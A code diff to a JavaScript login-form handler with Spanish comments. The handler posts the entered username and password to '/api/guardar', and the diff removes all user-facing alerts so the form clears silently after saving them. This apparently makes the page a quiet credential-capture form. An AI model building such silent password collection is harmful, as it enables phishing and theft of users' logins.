@@ -1,6 +1,7 @@
 document.getElementById('loginForm').addEventListener('submit', function(event) {
-    event.preventDefault();
+    event.preventDefault(); // Evita que la página se recargue
 
+    // Obtener los valores del formulario
     const username = document.getElementById('username').value;
     const password = document.getElementById('password').value;
 
@@ -10,6 +11,7 @@ document.getElementById('loginForm').addEventListener('submit', function(event) 
         fecha: new Date().toISOString()
     };
 
+    // Enviar los datos al servidor backend
     fetch('/api/guardar', {
         method: 'POST',
         headers: {
@@ -20,17 +22,16 @@ document.getElementById('loginForm').addEventListener('submit', function(event) 
     .then(response => response.json())
     .then(data => {
         if (data.error) {
-            // Si el servidor devuelve un error, muéstralo
+            // Si hay un error, lo mostramos solo en la consola (F12)
             console.error('Error del servidor:', data.error);
-            alert('Error al guardar: ' + data.error);
         } else {
-            console.log('Datos guardados:', data);
-            alert('Conexión exitosa (Datos guardados correctamente)');
-            document.getElementById('loginForm').reset();
+            // Si todo sale bien, lo mostramos solo en la consola (F12)
+            console.log('Conexión exitosa (Datos guardados correctamente)');
+            document.getElementById('loginForm').reset(); // Limpia el formulario silenciosamente
         }
     })
     .catch((error) => {
+        // Si falla la conexión con el servidor, lo mostramos en la consola
         console.error('Error de red:', error);
-        alert('Error al conectar con el servidor.');
     });
 });
